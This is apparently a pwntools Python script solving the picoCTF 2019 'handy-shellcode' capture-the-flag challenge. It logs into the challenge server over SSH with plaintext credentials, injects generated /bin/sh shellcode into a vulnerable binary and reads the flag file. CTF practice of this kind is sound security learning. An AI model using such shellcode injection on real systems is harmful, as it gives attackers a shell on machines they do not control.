from pwn import *
s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
s.set_working_directory(wd=b"/problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9")
# https://python3-pwntools.readthedocs.io/en/latest/shellcraft.html
# http://docs.pwntools.com/en/latest/asm.html
shellcode = asm(shellcraft.sh())
p = s.process("./vuln")
p.sendlineafter("Enter your shellcode:\n", shellcode)
p.sendlineafter("Thanks! Executing now...\n$ ", "cat flag.txt\n")
flag = p.recv(timeout=1).decode("utf-8") # https://stackoverflow.com/questions/606191/convert-bytes-to-a-string
flag = flag.split("{")[1].split("}")[0]
print(flag)
